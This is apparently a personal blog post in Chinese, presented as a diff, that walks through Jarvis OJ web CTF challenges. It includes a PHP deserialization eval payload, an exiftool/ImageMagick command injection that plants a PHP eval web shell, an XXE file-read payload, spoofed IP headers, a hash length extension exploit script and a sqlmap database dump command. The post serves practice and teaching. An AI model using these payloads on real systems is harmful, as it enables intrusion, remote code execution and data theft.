@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="https://winter3un.github.io">
+  <title>【web】jarvis oj 刷题 | WinterSun Space</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="web？1234567891011import npo = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86,">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【web】jarvis oj 刷题">
+<meta property="og:url" content="https://winter3un.github.io/2017/06/17/jarvisoj-web/index.html">
+<meta property="og:site_name" content="WinterSun Space">
+<meta property="og:description" content="web？1234567891011import npo = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86,">
+<meta property="og:updated_time" content="2017-06-17T14:14:40.258Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【web】jarvis oj 刷题">
+<meta name="twitter:description" content="web？1234567891011import npo = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86,">
+  
+    <link rel="alternative" href="/atom.xml" title="WinterSun Space" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/main.css?v=4.0.0">
+  
+
+  
+
+</head>
+
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="https://avatars1.githubusercontent.com/u/12570968?v=3&amp;s=460" class="js-avatar">
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">WinterSun</a></h1>
+		</hgroup>
+
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+	        
+    		
+    			
+    			<a data-idx="0" q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+    			
+            
+    			
+    			<a data-idx="1" q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
+    			
+    			
+            
+    			
+    			<a data-idx="2" q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
+    			
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="github" target="_blank" href="https://github.com/Winter3un" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Winter3un/activities" title="zhihu"><i class="icon-zhihu"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"><i class="icon-sort"></i></div>
+  		<h1 class="header-author js-mobile-header hide">WinterSun</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="https://avatars1.githubusercontent.com/u/12570968?v=3&amp;s=460" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">WinterSun</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+		        
+		        	<li><a href="/archives/">所有文章</a></li>
+		        
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/Winter3un" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Winter3un/activities" title="zhihu"><i class="icon-zhihu"></i></a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            <article id="post-jarvisoj-web" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      【web】jarvis oj 刷题
+    </h1>
+  
+
+        <a href="/2017/06/17/jarvisoj-web/" class="archive-article-date">
+  	<time datetime="2017-06-17T14:13:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-17</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="web？"><a href="#web？" class="headerlink" title="web？"></a>web？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import np</div><div class="line">o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]]</div><div class="line">r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259]</div><div class="line">o = np.array(o)</div><div class="line">r = np.array(r)</div><div class="line">x = np.linalg.solve(o,r)</div><div class="line">print x</div><div class="line">string = &apos;&apos;</div><div class="line">for i in x:</div><div class="line">    string += chr(int(str(i)[0:-2]))</div><div class="line">print string</div></pre></td></tr></table></figure>
+<h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>反序列化漏洞，比较新的一点是利用了php upload过程中的session来进行漏洞利用。</p>
+<p>html构造如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/phpinfo.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
+<p>几个payload </p>
+<p><code>print_r(dirname(__FILE__));</code><br><code>print_r(scandir(dirname(__FILE__)));</code><br><code>print_r(file_get_contents(&quot;Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code><br>序列化payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</div><div class="line">session_start();</div><div class="line">class OowoO</div><div class="line">&#123;</div><div class="line">    public $mdzz;</div><div class="line">    function __construct()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function __destruct()</div><div class="line">    &#123;</div><div class="line">        eval($this-&gt;mdzz);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$m = new OowoO();</div><div class="line">$m-&gt;mdzz = &quot;print_r(dirname(__FILE__));&quot;; </div><div class="line"></div><div class="line">echo serialize($m);</div><div class="line">//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(__FILE__));&quot;;&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>ps: </p>
+<p>参考资料<br>PHP Session 序列化及反序列化处理器 <a href="http://www.tuicool.com/articles/zEfuEz" target="_blank" rel="external">http://www.tuicool.com/articles/zEfuEz</a></p>
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>cve漏洞 imagick</p>
+<p><code>exiftool -label=&quot;\&quot;|/usr/bin/id; \&quot;&quot; imagick.png</code></p>
+<p>shell</p>
+<p><code>exiftool -label=&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\$\_POST\[a\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/1.php; \&quot;&quot; imagick.png</code></p>
+<p><code>CTF{873dfee87823248f4a1657650204697a}</code></p>
+<h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>一开始一脸懵比。。。</p>
+<p>原来是XXE攻击</p>
+<p>payload一发带走</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;search&gt;name&lt;/search&gt;</div><div class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
+<h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>考点：文件包含漏洞</p>
+<p>1、泄露源码</p>
+<p>但是关键字符被waf挡住了。</p>
+<p>上传图片马</p>
+<p><code>uploads/1497485980.gif</code></p>
+<p>还是被waf拦截了，使用<code>&lt;script&gt;</code>绕过</p>
+<p><code>CTF{upl0ad_sh0uld_n07_b3_a110wed}</code></p>
+<h3 id="chopper"><a href="#chopper" class="headerlink" title="chopper"></a>chopper</h3><p>考察点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 127.0.0.1</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">X-Remote-IP: 127.0.0.1</div><div class="line">X-Remote-Addr: 127.0.0.1</div><div class="line">X-Client-IP: 127.0.0.1</div></pre></td></tr></table></figure></p>
+<p>ssrf中ip.src的构建。</p>
+<p>信息获取能力</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">robots.txt</div><div class="line">.index.php.swp</div><div class="line">.index.php.swo</div><div class="line">index.txt</div><div class="line">index.bak</div><div class="line">index.php~</div><div class="line">test.php</div><div class="line">index.phps</div><div class="line">phpinfo.php</div></pre></td></tr></table></figure>
+<p>在robots.txt中找到线索。在burp repeater中，change action method 使get变成post，成功执行。</p>
+<p><code>CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}</code></p>
+<h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>考察点：</p>
+<p>信息获取能力</p>
+<p>vim缓存文件恢复 <code>vim -r index.php</code></p>
+<p>哈希长度扩展攻击</p>
+<p>可利用工具：</p>
+<p><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="external">https://github.com/iagox86/hash_extender</a></p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests,os,urllib</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">	cmd = <span class="string">'./hash_extender -d ";\\"tseug\\":5:s" -s "3a4727d57463f122833d9e732f94e4e0" -a ";\\"nimda\\":5:s"  -f md5 --out-data-format=html -q -l '</span>+str(x)</div><div class="line">	<span class="comment"># print cmd</span></div><div class="line">	p = os.popen(cmd).read()</div><div class="line">	<span class="comment"># break</span></div><div class="line">	url = <span class="string">"http://web.jarvisoj.com:32778/"</span></div><div class="line">	payload = <span class="string">"__cfduid=d08f46c0f9fbc7e86bab05b2d091bb7c81496549709; UM_distinctid=15c715066e3a8a-0f985be0b8ac06-5393662-1fa400-15c715066e4104b; "</span></div><div class="line">	payload += <span class="string">"hsh="</span>+p[:<span class="number">32</span>]+<span class="string">";"</span></div><div class="line"></div><div class="line">	payload +=<span class="string">"role="</span>+urllib.quote(urllib.unquote(p[<span class="number">32</span>:])[::<span class="number">-1</span>])+<span class="string">";"</span></div><div class="line">	<span class="comment"># print payload</span></div><div class="line">	<span class="comment"># break</span></div><div class="line">	head = &#123;<span class="string">"Cookie"</span>:payload&#125;</div><div class="line"></div><div class="line"></div><div class="line">	data = requests.get(url=url,headers=head).content</div><div class="line">	<span class="keyword">if</span> len(data) != <span class="number">210</span>:</div><div class="line">		<span class="keyword">print</span> data</div></pre></td></tr></table></figure>
+<p>参考资料：</p>
+<p><a href="https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90" target="_blank" rel="external">https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90</a></p>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>逆向思路。。gdb调试一波，拿到flag。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line"></div><div class="line">//动态链接库路径</div><div class="line">#define LIB_CACULATE_PATH &quot;./udf.so&quot;</div><div class="line"></div><div class="line">//函数指针</div><div class="line">typedef int (*CAC_FUNC)();</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    void *handle;</div><div class="line">    char *error;</div><div class="line">    CAC_FUNC cac_func = NULL;</div><div class="line"></div><div class="line">    //打开动态链接库</div><div class="line">    handle = dlopen(LIB_CACULATE_PATH, RTLD_LAZY);</div><div class="line">    if (!handle) &#123;</div><div class="line">    fprintf(stderr, &quot;%s\n&quot;, dlerror());</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    //清除之前存在的错误</div><div class="line">    dlerror();</div><div class="line"></div><div class="line">    //获取一个函数</div><div class="line">    *(void **) (&amp;cac_func) = dlsym(handle, &quot;getflag&quot;);</div><div class="line">    if ((error = dlerror()) != NULL)  &#123;</div><div class="line">    fprintf(stderr, &quot;%s\n&quot;, error);</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line">    (*cac_func)();</div><div class="line">    dlclose(handle);</div><div class="line">    exit(EXIT_SUCCESS);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h3><p><code>sqlmap -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --data &quot;username=123&amp;password=123&quot; --tamper=space2comment -D injection --dump</code></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
+	</div>
+
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://winter3un.github.io/2017/06/17/jarvisoj-web/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2017/06/04/heap-all/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          【pwn】cuit2017 &amp; 0ctf2017 heap总结
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+
+
+
+
+
+
+
+
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2017 WinterSun
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		mathjax: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		root: "/",
+		innerArchive: true
+	}
+</script>
+
+<script src="/./main.js?v=4.0.0"></script>
+
+
+    
+<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all" q-show="innerArchive">
+        <div class="search-wrap">
+          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
+          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
+          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
+        </div>
+        <div class="widget tagcloud search-tag">
+          <p class="search-tag-wording">tag:</p>
+          <label class="search-switch">
+            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
+          </label>
+          <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">pwn</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">AWD</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ARM</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">code</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Writeup</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">writeup</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">heap overflow</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">bctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">arm</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">bin</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">heap</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">wargame</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">pwntools</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">fmt</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">note</a>
+              </li>
+            
+            <div class="clearfix"></div>
+          </ul>
+        </div>
+        <ul class="search-ul">
+          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
+            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            2、在根目录_config.yml里添加配置：
+<pre style="font-size: 12px;" q-show="jsonFail">
+  jsonContent:
+    meta: false
+    pages: false
+    posts:
+      title: true
+      date: true
+      path: true
+      text: true
+      raw: false
+      content: false
+      slug: false
+      updated: false
+      comments: false
+      link: false
+      permalink: false
+      excerpt: false
+      categories: false
+      tags: true
+</pre>
+          </p>
+          <li class="search-li" q-repeat="items" q-show="isShow">
+            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
+            <p class="search-time">
+              <i class="icon-calendar icon"></i>
+              <span q-text="date|dateformat"></span>
+            </p>
+            <p class="search-tag">
+              <i class="icon-price-tags icon"></i>
+              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
+            </p>
+          </li>
+        </ul>
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-friends" q-show="friends">
+  		
+        <ul class="search-ul">
+          
+            <li class="search-li">
+              <a href="http://o0xmuhe.me/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>MuHe</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://www.bertramc.cn/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>bertramc</a>
+            </li>
+          
+        </ul>
+  		
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-me" q-show="aboutme">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">曾实习于安恒、桐乡市公安局反欺诈中心、Mirage队长、CTF玩家、网络安全研究员、pwner、半赛棍、浙警院13级学生</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
